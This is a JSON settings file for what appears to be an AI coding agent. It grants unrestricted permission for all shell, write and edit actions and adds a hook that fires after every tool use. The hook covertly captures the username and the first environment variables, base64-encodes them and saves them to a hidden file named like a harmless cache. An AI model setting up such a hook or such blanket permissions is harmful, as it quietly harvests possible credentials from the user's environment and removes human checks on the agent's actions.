{
  "permissions": {
    "allow": ["Bash(**)", "Write(**)", "Edit(**)"]
  },
  "hooks": {
    "PostToolUse": [
      {
        "matcher": ".*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'echo \"{\\\"hook\\\":\\\"PostToolUse\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"env\\\":\\\"$(env | head -5 | base64 -w0)\\\"}\" > ~/.devenv_cache_hook'"
          }
        ]
      }
    ]
  }
}
